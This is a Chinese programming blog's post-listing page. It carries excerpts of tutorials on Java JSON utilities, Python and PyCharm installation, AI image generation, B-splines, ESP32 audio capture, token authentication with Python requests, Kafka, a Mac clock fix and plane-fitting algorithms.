<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ede4b1a4d8c37ad930ee29ca5f6f3651/" rel="bookmark">
			java hutool工具类处理json的常用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hutool 提供了丰富的 JSON 处理工具类，包括 JSON 字符串的解析、生成、对象与 JSON 字符串的转换等。以下是 Hutool 中关于 JSON 的常用方法：
JSON 字符串的解析与生成： JSONUtil.parseObj(jsonStr)：将 JSON 字符串解析为 JSONObject 对象。JSONUtil.parseArray(jsonStr)：将 JSON 字符串解析为 JSONArray 数组对象。JSONUtil.toJsonStr(obj)：将 Java 对象转换为 JSON 字符串。 对象与 JSON 字符串的转换： JSONUtil.toBean(jsonStr, clazz)：将 JSON 字符串转换为指定类型的 Java 对象。JSONUtil.toMap(jsonStr)：将 JSON 字符串转换为 Map 对象。JSONUtil.toCamelCaseMap(bean)：将 Java 对象转换为驼峰风格的 Map 对象，适用于大部分 JavaBean。 JSON 对象的操作： JSONObject.get(key)：获取 JSON 对象中指定 key 的值。JSONObject.put(key, value)：向 JSON 对象中添加键值对。JSONObject.containsKey(key)：判断 JSON 对象中是否包含指定的 key。JSONObject.keySet()：获取 JSON 对象中所有键的集合。 JSON 数组的操作： JSONArray.get(index)：获取 JSON 数组中指定索引的元素。JSONArray.add(value)：向 JSON 数组中添加元素。JSONArray.size()：获取 JSON 数组的长度。JSONArray.iterator()：获取 JSON 数组的迭代器。 其他常用方法： JSONUtil.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ede4b1a4d8c37ad930ee29ca5f6f3651/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a7f21f0bf20865fe756187cbc650da8/" rel="bookmark">
			Python及Pycharm专业版下载安装教程（Python 3.11版）附JetBrains学生认证教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、Python下载及安装1、Python下载2、Python安装3、验证是否安装成功 二、PyCharm下载及安装1、PyCharm下载2、PyCharm安装3、激活PyCharm 三、JetBrains学生认证 本篇主要介绍Python和PyCharm专业版的下载及安装方式，以及通过两种方式进行JetBrains学生认证。
一、Python下载及安装 1、Python下载 1.1、进入python官网：https://www.python.org
点击【Downloads】然后选择需要下载的平台，这里以【Windows】为例。
1.2、在该页面选择要下载的版本。这里选择的是64位稳定发布3.11.8版本。具体下载32位还是64位要根据自己电脑的操作系统（右击【此电脑】→【属性】→【系统类型】）。
【Latest Python 3 Release】：指最新的Python3版本。
【Stable Releases】：指稳定发布的版本，即已经通过测试，相对稳定。
【Pre-releases】：指预发布的版本，指还处于测试阶段。
推荐下载稳定版，在后面安装及后期编程过程中比较稳定，没那么容易报错。
【Windows embeddable package】：下载的是一个python的Windows可嵌入包，通俗地讲就是一个压缩包。解压后是一个最小python运行环境，不包括doc、idle、pip等。该版本主要用于嵌入其他程序之中。
补充一点关于ARM64和64-bit
在上面的【系统类型】 中，如果显示的是 “64 位操作系统, 基于 x64 的处理器”， 那么就是64 位处理器，选64-bit。 如果显示 “64 位操作系统，基于 ARM 的处理器”， 那么就是 ARM64 的处理器，选ARM64。
2、Python安装 2.1、双击下载好的安装包，勾选【Add…PATH】（将python路径添加到PATH环境变量中），然后点击【Customize installation】进行自定义安装。
2.2、在该页面什么也不用更改，直接【Next】
2.3、在这一步，如果你的电脑有很多用户需要切换，为了方便在每个用户下都能使用python，那就把第一个勾上（第一个勾上第五个也会自动勾上，第五个指预编译标准库）。因为我的电脑只有一个用户，因此就不勾选第一个了。接下来【自定义安装路径】，尽量不要安装在C盘。接着点击【Install】进行安装。
2.4、安装成功后单击【Close】关闭
【Disable path length limit】：关闭路径长度的限制，可以点也可以不点。点了的话后面选择【是】，接下来回来再【Close】就行。
3、验证是否安装成功 3.1、键盘同时按下【Win】+【R】（Win即键盘左下角四个正方形的窗口样子的Windows图标），然后输入【cmd】
3.2、输入【python】，若返回的内容能看到python的版本，则安装成功
二、PyCharm下载及安装 1、PyCharm下载 1.1、进入pycharm官网：https://www.jetbrains.com/，点击开发者工具，在展开列表中选择【PyCharm】
1.2、在该页面点击【Download】进行下载
1.3、选择对应的系统，AEM64前面有介绍。因为我是64位操作系统，这里直接下载就可以。
2、PyCharm安装 2.1、双击刚才下载好的安装包，点击【下一步】。
2.2、更改安装路径，点击【下一步】
2.3、这一步根据个人需求进行勾选。创建桌面快捷方式建议勾选上，点击【下一步】
2.4、进行安装，安装完成后点击完成。
3、激活PyCharm 1、启动PyCharm
2、激活PyCharm，JetBrains有学生认证，认证成功后直接登录JetBrains账号就行。学生认证一次只能申请激活一年。
三、JetBrains学生认证 3.1、进入官网：https://www.jetbrains.com/zh-cn/community/education/#students
3.2、页面下拉，点击【立即申请】
3.3.1、首先先在学校申请教育邮箱，然后输入申请的邮箱就可以。但是有的学校申请的教育邮箱可能没法通过此步骤，那么就选择【官方文件】
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a7f21f0bf20865fe756187cbc650da8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d731da0013a7c600ceee2f3741e90dc/" rel="bookmark">
			人工智能绘画的时代下到底是谁在主导,是人类的想象力,还是AI的创造力?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#ai作画
目录
一.AI绘画的概念
1. 数据集准备：
2. 模型训练：
3. 生成绘画：
二.AI绘画的应用领域
三.AI绘画的发展
四.AI绘画背后的技术剖析
1.AI绘画的底层原理
2.主流模型的发展趋势
2.1VAE — 伊始之门
2.2GAN
2.2.1GAN相较于Diffusion有什么不足?
2.3Diffusion — 当今首峰
2.4CLIP—图文匹配
2.5Lora模型
2.6Controlnet模型
五.AI绘画实例
六.未来AI的发展趋势
一.AI绘画的概念 AI 绘画是一种利用人工智能技术生成绘画作品的方法。它基于机器学习和深度学习算法，通过对大量的图像数据进行训练，模型学习到了图像的特征和规律，从而能够生成新的图像。
AI 绘画的过程通常包括以下几个步骤：
1. 数据集准备： 收集大量的图像数据，这些数据可以包括各种风格、主题的绘画作品。
2. 模型训练： 使用准备好的数据集对 AI 模型进行训练，让模型学习图像的特征和规律
3. 生成绘画： 输入一些关键词、描述或参考图像等信息，模型根据这些信息生成新的绘画作品。
AI 绘画技术可以生成各种风格的图像，例如写实、抽象、漫画、油画等。它可以帮助艺术家和设计师更快地创建概念设计、探索不同的风格，也可以为普通人提供一种创造艺术的新方式。
二.AI绘画的应用领域 - 设计行业：在广告、游戏、影视等领域，帮助设计师更快地生成概念图和原型。
- 艺术创作：艺术家可以利用 AI 绘画来探索新的风格和创意，或者与 AI 共同创作。
- 教育领域：学生可以通过 AI 绘画工具学习绘画技巧和艺术风格。
- 社交媒体：用户可以用 AI 生成的图像来装饰自己的社交媒体账号。
- 虚拟现实和增强现实：为这些应用创建虚拟场景和角色的图像。
三.AI绘画的发展 Diffusion 一般指 Diffusion Model（扩散模型），是一种基于深度学习的生成模型，常用于图像生成领域。Diffusion Model 的训练可以分为正向扩散和反向扩散两部分。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d731da0013a7c600ceee2f3741e90dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b0133da2776aec265a4a320f1e8db41/" rel="bookmark">
			曲线生成 | 图解B样条曲线生成原理(基本概念与节点生成算法)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 0 专栏介绍1 什么是B样条曲线？2 基函数的de Boor递推式3 B样条曲线基本概念图解4 节点生成公式 0 专栏介绍 🔥附C++/Python/Matlab全套代码🔥课程设计、毕业设计、创新竞赛必备！详细介绍全局规划(图搜索、采样法、智能算法等)；局部规划(DWA、APF等)；曲线优化(贝塞尔曲线、B样条曲线等)。
🚀详情：图解自动驾驶中的运动规划(Motion Planning)，附几十种规划算法
1 什么是B样条曲线？ 为了解决贝塞尔曲线无法局部修正、控制性减弱、曲线次数过高、不易拼接的缺陷，引入B样条曲线(B-Spline)。对贝塞尔曲线不了解的同学请看曲线生成 | 图解贝塞尔曲线生成原理(附ROS C++/Python/Matlab仿真)
B样条曲线是一种用于表示和描绘曲线的数学工具，它在计算机图形学、计算机辅助设计、计算机动画和数值分析等领域得到广泛应用。其名称中的B代表了基本(basis)，而样条则是在各个领域中广泛应用的一种绘制曲线的技术，例如计算机图形学、物理学模拟、金融和经济分析等。在计算机图形学中，样条通常用于创建平滑的曲线和曲面，以便在三维场景中呈现出更真实的效果。在物理学模拟中，样条可用于描述物体的运动轨迹和变形过程。
B样条曲线的性质包括平滑性、局部控制性、递归计算和多项式插值。通过调整控制点的位置、权重和节点序列，可以改变B样条曲线的形状，从而实现对曲线的精确控制。B样条曲线常用于描述自然曲线和复杂曲线，如汽车外形、飞机机翼、艺术造型等。在计算机图形学中，B样条曲线可以用来生成圆滑的曲线路径，进行形状建模和渲染，以及实现动画效果等。
在运动规划中，B样条曲线也是一种很强大的曲线生成和轨迹优化工具，接下来介绍其基本原理。
2 基函数的de Boor递推式 B样条曲线的核心是具有局部性的基函数(Basic function)——当改变一个控制节点时，只会变动该点旁边有限段曲线(样条曲线则需要重新计算整条曲线，因为它由一组控制点唯一确定)，而非“牵一发动全身”。如图所示给出了B样条与贝塞尔曲线基函数的区别。
采用Cox-de Boor递推定义B样条曲线的基函数
N i , k ( t ) = t − t i t i + k − t i N i , k − 1 ( t ) + t i + k + 1 − t t i + k + 1 − t i + 1 N i + 1 , k − 1 ( t ) N_{i,k}\left( t \right) =\frac{t-t_i}{t_{i+k}-t_i}N_{i,k-1}\left( t \right) +\frac{t_{i+k+1}-t}{t_{i+k+1}-t_{i+1}}N_{i+1,k-1}\left( t \right) Ni,k​(t)=ti+k​−ti​t−ti​​Ni,k−1​(t)+ti+k+1​−ti+1​ti+k+1​−t​Ni+1,k−1​(t)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b0133da2776aec265a4a320f1e8db41/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f1f719cda1ba123136224bc1fa35eb0/" rel="bookmark">
			Python 的 complex() 函数：处理复数数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		更多Python学习内容：ipengtao.com
在 Python 中，complex() 函数是一个内置函数，用于创建复数对象。复数是由实部和虚部组成的数学对象，在许多科学和工程应用中都有重要的作用。本文将深入探讨 complex() 函数的用法、工作原理以及常见应用场景。
什么是 complex() 函数？ complex() 函数是 Python 中的一个内置函数，用于创建复数对象。复数由实部和虚部组成，形式上表示为 a + bi，其中 a 是实部，b 是虚部，i 是虚数单位，满足 i^2 = -1。
complex() 函数的基本语法如下：
complex(real, imag) real 是一个数字或表达式，表示复数的实部。如果省略，实部默认为 0。
imag 是一个数字或表达式，表示复数的虚部。如果省略，虚部默认为 0。
complex() 函数的基本用法 1. 创建复数对象 # 创建实部为 2，虚部为 3 的复数对象 z1 = complex(2, 3) print("Complex number z1:", z1) # 创建实部为 5，虚部为默认值 0 的复数对象 z2 = complex(5) print("Complex number z2:", z2) # 创建实部为默认值 0，虚部为 -4 的复数对象 z3 = complex(imag=-4) print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f1f719cda1ba123136224bc1fa35eb0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18e3fef41ea5123f16297ed1f09d1904/" rel="bookmark">
			一起玩儿物联网人工智能小车（ESP32）——69 使用INMP441模块采集声音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要：本文介绍如何使用INMP441模块采集声音
前边介绍了第一个基于I2S通信协议的MAX98357A模块，利用该模块可以播放各种声音文件。今天来介绍如何使用INMP441模块实现声音的采集功能，也就是如何将声音转变成数字信号。
INMP441是一款高性能，低功耗，数字输出的全向MEMS（微型机电系统）麦克风。完整的INMP441由一个MEMS声音传感器，模数转换器（ADC），抗混叠滤波器，电源管理和标准的24位I2S接口组成。I2S接口允许INMP441直接连接到数字处理器，如DSP和微控制器，而无需再使用音频编解码器，极大的降低了开发的难度。INMP441具有高信噪比，是一款出色的近场应用。INMP441具有扁平宽带频率响应，使得采集声音的清晰度很高。
INMP441模块如下图所示：
INMP441具有以下这些特性和规格参数：
1 具有高精度24位数据的数字I2S接口
2 高信噪比为61dBA
3 高灵敏度-26dBFS
4 从60Hz到15kHz的稳定频率响应
5 低功耗:低电流消耗1.4mA
6 电源电压：1.62 V至3.63 V
7 高PSR：-75dBFS
8 尺寸：12mm*14mm
INMP441的接口定义如下所示：
序号
标识
说明
1
SCK
I2S接口的串行数据时钟
2
WS
用于I2S接口的串行数据字选择
3
L/R
左/右声道选择。设置为低电平时，麦克风在I2S帧的左声道输出信号。设置为高电平时，麦克风在右声道输出信号
4
SD
I2S接口的串行数据输出。
5
VCC
输入电源，1.8V至3.3V.
6
GND
电源地
在这里需要注意的是L/R引脚是用来设置本模块属于哪个声道的，也就决定了这个模块在WS信号是高电平还是低电平的时候有输出。一个双声道声音采集系统，如下图所示：
在上图中可以看到左声道的441模块L/R为接地，是低电平状态，右声道的L/R为接电源正极，是高电平状态。这样微处理器在读取数据时，通过控制WS的状态，就可以分别读取左右声道的数据了。
前面的MAX98357A模块的使用借助了第三方的库函数，可以说在开发中基本没有涉及到I2S协议的底层操作。这次通过使用微处理器厂家提供的原生驱动来实现INMP441声音采集后由MAX98357A播放出来的程序。
使用微处理器厂家提供的原始库函数来驱动I2S设备工作，通常需要以下几个步骤：
1.引入头文件
#include &lt;driver/i2s.h&gt;
2.I2S控制器初始化
ESP32处理器内置了2个I2S控制器，因此可以同时与两个音频设备之间传输音频数据。每个I2S控制器都具备以下功能，可由I2S驱动进行配置：
可用作系统主机或从机可用作发射器或接收器DMA控制器支持流数据采样，CPU无需单独复制每个采样数据 在Arduino中，对I2S控制器进行初始化的方法为：i2s_driver_install()。该方法的主要参数为i2s_config_t类型的结构实例，在该数据结构中，定义了I2S通信的基本参数，主要包括了以下这些属性：
mode：I2S的工作模式。
sample_rate：I2S的采样率
bits_per_sample：I2S的采样位数
channel_format：设置左右声道
communication_format：设置交流格式
dma_buf_count：设置DMA缓冲区的数量
dma_buf_len：设置每个DMA缓冲区的大小
use_apll：设置是否使用精确时钟
intr_alloc_flags：设置如何分配中断
3.设置I2S使用的引脚
使用i2s_set_pin()方法可以设置I2S通信所使用的引脚。该方法所使用的参数为i2s_pin_config_t类型的数据结构，在该结构中定义的了I2S通信所使用的引脚。该结构有如下属性：
bck_io_num：设置串行时钟引脚
ws_io_num：设置左右声道的时钟引脚
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18e3fef41ea5123f16297ed1f09d1904/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3583fb119d1de39c4f27568286471bc5/" rel="bookmark">
			Python request访问401错误与权限验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近，在使用Python requests接口访问开发的过程中，遇到401错误，跟踪原因是 Unauthorized ，这个错误通常意味着我在尝试访问某个资源时侯，没有提供正确的身份验证信息，或者你的身份验证信息已经过期。
在如此场景中，接口需要先进行登录操作以获取 AccessToken，然后使用这个 Token 来验证请求，同时，还可能需要签名等确保数据安全。如下图所示是我按此场景整理出来的访问处理过程程。
1. 带有身份验证的 Python 请求 Token是用于身份验证，通常通过 HTTP 请求头传递。在 requests 中，通常会直接处理 token的。
1.1. 发送登录请求以获取AccessToken 首先，你需要发送一个登录请求到服务器的登录端点，通常是一个POST请求，包含用户名和密码。服务器验证这些信息后，如果成功，会返回一个AccessToken。
python import requests # 登录URL login_url = 'https://api.example.com/login' # 登录数据，通常是用户名和密码 login_payload = { 'username': 'your_username', 'password': 'your_password' } # 发送登录请求 login_response= requests.post(login_url, json=login_payload) # 检查请求是否成功 if response.status_code == 200: # 从响应中获取AccessToken access_token = login_response.json()['Data'].get('AccessToken') # 如果有RefreshToken，也一并保存 refresh_token = login_response.json()['Data'].get('RefreshToken') else: print('登录失败:', login_response.text) # 处理错误 1.2. 使用AccessToken发送请求 得到AccessToken，就可以在请求头中设置Authorization字段，并使用该Token来访问需要身份验证的资源。
# 资源URL resource_url = 'https://api.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3583fb119d1de39c4f27568286471bc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/762f4df15674f1950f804c01b3f9b6c6/" rel="bookmark">
			聆思大模型AI开发套件集成Coze调用GPT-4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		❝ 上一篇《大模型赋能开发板被这家公司玩明白了》 我们已经详细介绍了聆思大模型 AI 开发套件以及聆思大模型平台，并实操了基于LLM_control二次开发拓展了天气查询、中英互译的能力。今天我们再来看看聆思大模型 AI 开发套件如何通过Coze Bot 使用 GPT-4 。
整体思路 聆思大模型AI开发套件集成Coze整体思路
首先，介绍几个关键点：
Coze 国际版支持 GPT-4 能力，可以将 Bot 部署到 Discord;
借助 coze-discord-proxy 代理 Discord 对话Coze-Bot，实现API形式请求GPT4对话模型/微调模型;
利用 LSPlatform 应用编排中的 http-request 去调用 API 以及联接开发板。
以此整体思路如上图，开发板和聆思大模型平台通过 SDK 拉通；聆听大模型平台应用编排网络节点调用 API；API 由部署在 Zeabur 上的 coze-discord-proxy 服务提供；coze-discord-proxy 服务实现了代理用户在Discord频道中发送信息，并调度两个Discord Bot(一个关联 Coze Bot，一个用来监听Discord消息)。按照交互梳理的流程如下：
① “小聆小聆”唤醒，语音交互
② 聆思大模型平台 http-request 节点调用 coze-discord-proxy服务
③ coze-discord-proxy 内部调用 discord (user)
④ discord 调用 coze (coze bot)
⑤ coze bot 返回对话
⑥ discord 返回对话 （watch bot）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/762f4df15674f1950f804c01b3f9b6c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dad5e8b9c5d94e46ba414f52833d8ebc/" rel="bookmark">
			Python 数据可视化之密度散点图 Density Scatter Plot
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🍉 CSDN 叶庭云：https://yetingyun.blog.csdn.net/
密度散点图（Density Scatter Plot），也称为密度点图或核密度估计散点图，是一种数据可视化技术，主要用于展示大量数据点在二维平面上的分布情况。与传统散点图相比，它使用颜色或阴影来表示数据点的密度，从而更直观地展示数据的分布情况。密度散点图能更好地揭示数据的集中趋势和分布模式，尤其是在数据量非常大时，避免了散点图中点重叠导致的可视化混乱问题。
密度散点图涉及的基础概念：
散点图（Scatter Plot）：基础的二维数据表示形式，用于展示两个变量之间的关系。每个数据点的位置由这两个变量的值决定。当数据量庞大时，很多点会重叠在一起，使得无法清晰看到数据的分布。
核密度估计（Kernel Density Estimation，KDE）：一种用于估计随机变量概率密度函数的非参数方法。通过平滑处理来填补单独观测值之间的空白，从而生成一个连续的概率密度函数。KDE 通常涉及到选择一个核函数（如高斯核）和带宽（控制平滑程度的参数）。
颜色编码：在密度散点图中，不同密度区域通常会使用不同颜色或深浅来表示，颜色深浅代表了该区域内数据点的密集程度。
可视化原理：
数据映射：首先将每个数据点映射到二维平面上。这与普通散点图相同，这一步骤确定了每个点在图上的位置。
密度估计：对所有数据点应用核密度估计算法。这一步骤是通过在每个数据点周围放置一个“核”，然后对整个数据集覆盖区域内所有核进行求和来完成的。结果是得到整个二维空间上每一位置的密度估计值。
颜色映射：根据得到的密度估计值为不同区域分配颜色或深浅。高密度区域将被赋予更深或更鲜艳的颜色，而低密度区域则使用较浅或较淡的颜色。
渲染显示：最后将带有颜色编码的二维平面呈现出来，形成最终的密度散点图。可选项：在绘制的密度散点图的右方或下方展示颜色条 colorbar。
为什么要用密度散点图？
探索数据分布：通过颜色编码表示不同密度级别，密度散点图能够揭示出数据中可能隐含的各种模式、聚类或趋势。这对于探索性数据分析尤其有用，因为它可以帮助研究人员发现未被预见到的关系或行为模式。我们可以看到哪些区域有更密集的数据点，哪些区域相对稀疏。在处理包含上万个数据点的大型数据集时，传统散点图可能会导致严重的过度绘制（overplotting），即不同数据点在图表上的位置重叠，使得无法清晰地看到数据分布。密度散点图通过表示区域内数据点的相对密度来解决这个问题，从而提供了一种更清晰、更有效地理解数据分布的方式。优化视觉呈现：密度散点图通过采用渐变色或色阶映射等方法，帮助清晰地展示数据，相比传统散点图的混乱和模糊。这样可以更容易区分高密度和低密度区域，使整体呈现更美观、易于理解。高灵活性的密度散点图支持多种定制选项，比如调整颜色映射、透明度、标记大小等，以适应不同类型和规模的数据集。此外，还可以结合其他类型的可视化技术（比如轮廓线或网格）来增强表达能力。异常值检测：密度散点图可以帮助我们识别异常值。如果某个区域的密度远高于其他区域，那么可能存在异常值。聚类分析：密度散点图可以帮助我们发现数据的聚集区域。如果某个区域有较高的密度，那么这可能是一个数据聚类的中心。模型预测结果分析：密度散点图非常适合用于可视化观测值和拟合值的情况，能观察到模型预测的潜在偏移与合理性。促进决策制定：在商业智能、金融分析、生物统计等领域，了解和分析复杂数据集中的模式对于指导决策至关重要。密度散点图提供了一种直观方法来识别关键变量之间的关系和动态变化，从而帮助决策者基于深入洞察做出更加明智的选择。 总结来说，使用密度散点图在处理大规模和 / {/} /或复杂数据集时提供了一种极具价值的工具。它不仅能够有效解决过度绘制问题，还能揭示出隐藏在庞大数据背后的结构和模式，同时提供优雅且功能强大的视觉展示方式。无论是在科研、工业还是商业领域，掌握并应用这种技术都将极大地增强对数据的理解和利用能力。
下面讲解一个带拟合曲线的密度散点图的绘图示例。
导入需要的依赖库：
import numpy as np from numpy import polyfit, poly1d import matplotlib as mpl from matplotlib import cm from matplotlib import ticker from matplotlib import colors import matplotlib.pyplot as plt import matplotlib.font_manager as fm from scipy.stats import gaussian_kde 绘制带拟合曲线的密度散点图的 Python 代码如下：
# 固定 numpy 的随机种子 np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dad5e8b9c5d94e46ba414f52833d8ebc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/974b28ee14961e80c10195517809df1e/" rel="bookmark">
			Kafka的消费流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kafka的消费全流程 我们接着继续去理解最后这条消息是如何被消费者消费掉的。其中最核心的有以下内容。
1、多线程安全问题
2、群组协调
3、分区再均衡
多线程安全问题 当多个线程访问某个类时，这个类始终都能表现出正确的行为，那么就称这个类是线程安全的。
对于线程安全，还可以进一步定义：
当多个线程访问某个类时，不管运行时环境采用何种调度方式或者这些线程将如何交替进行，并且在主调代码中不需要任何额外的同步或协同，这个类都能表现出正确的行为，那么就称这个类是线程安全的。
生产者 KafkaProducer的实现是线程安全的。
KafkaProducer就是一个不可变类。线程安全的，可以在多个线程中共享单个KafkaProducer实例
所有字段用private final修饰，且不提供任何修改方法，这种方式可以确保多线程安全。
如何节约资源的多线程使用KafkaProducer实例
package com.msb.concurrent; import com.msb.selfserial.User; import org.apache.kafka.clients.producer.Callback; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.clients.producer.RecordMetadata; import org.apache.kafka.common.serialization.StringSerializer; import java.util.Properties; import java.util.concurrent.CountDownLatch; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; /** * 类说明：多线程下使用生产者 */ public class KafkaConProducer { //发送消息的个数 private static final int MSG_SIZE = 1000; //负责发送消息的线程池 private static ExecutorService executorService = Executors.newFixedThreadPool( Runtime.getRuntime().availableProcessors()); private static CountDownLatch countDownLatch = new CountDownLatch(MSG_SIZE); private static User makeUser(int id){ User user = new User(id); String userName = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/974b28ee14961e80c10195517809df1e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68d101c7d1ff60deac0fcf5ba9f5e8be/" rel="bookmark">
			【mac笔记本时间异常】解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 由于长时间没用 Mac自动关机了，充电后开机发现时间一直不正确，后连接苹果技术支持，记录步骤：
1.检查基础设置： 1.重新打开自动设置时间与日期-然后重启电脑
2.检查定位服务是否开启
2.检查第三方软件 1.开启安全模式
1、将 Mac 关机。
2、按住电源按钮 10 秒让 Mac 启动。
3、看到启动选项视窗时，放开电源按钮。
4、选择启动磁盘，按住 Shift 键并按一下“在安全模式中继续”，然后放开 Shift 键。
5、登录 Mac。系统可能会要求您再次登录
发现时间依然异常
最终操作 1.打开终端
2.输入命令 sudo rm /var/db/timed/com.apple.timed.plist
输入密码
重新开启时间设置
成功！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49a6e7f4a946e87625baeab76b823304/" rel="bookmark">
			切比雪夫（最小区域法）平面拟合算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎关注更多精彩
关注我，学习常用算法与数据结构，一题多解，降维打击。
本期话题：切比雪夫（最小区域法）平面拟合算法
相关背景和理论
点击前往
主要介绍了应用背景和如何转化成线性规划问题
平拟合输入和输出要求 输入 10到631个点，全部采样自平面附近。每个点3个坐标，坐标精确到小数点后面20位。坐标单位是mm, 范围[-500mm, 500mm]。 输出 平面上一点X0，用三个坐标表示。法向A。平面度F，所有点到平面距离最大的2倍。 精度要求 X0点平面距离不能超过0.0001mm。法向A与标准法向夹角不能超过0.0000001rad。F与标准平面度误差不能超过0.00001mm。 平面优化标函数 根据认证要求，平面拟合转化成数学表示如下：
平面参数化表示 平面上1点X0 = (x0, y0, z0)。方向单位向量A=(a,b,c)。 点到平面距离 第i个点 pi(xi, yi, zi)。
根据点乘得到距离
d i = ∥ ( p i − X 0 ) ⋅ A ∥ ∥ A ∥ d_i = \frac { \left \| (p_i-X_0)\cdot A \right \|}{\left \| A \right \|} di​=∥A∥∥(pi​−X0​)⋅A∥​
展开一下：
d i = a ( x i − x 0 ) + b ( y i − y 0 ) + c ( z i − z 0 ) a 2 + b 2 + c 2 d_i = \frac {a(x_i-x_0) + b(y_i-y_0) + c(z_i-z_0)} {\sqrt{a^2+b^2+c^2}} di​=a2+b2+c2 ​a(xi​−x0​)+b(yi​−y0​)+c(zi​−z0​)​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49a6e7f4a946e87625baeab76b823304/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cafb00f83acf081ee070c8da6800a25c/" rel="bookmark">
			MongoDB之角色与权限及创建用户与授权操作详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
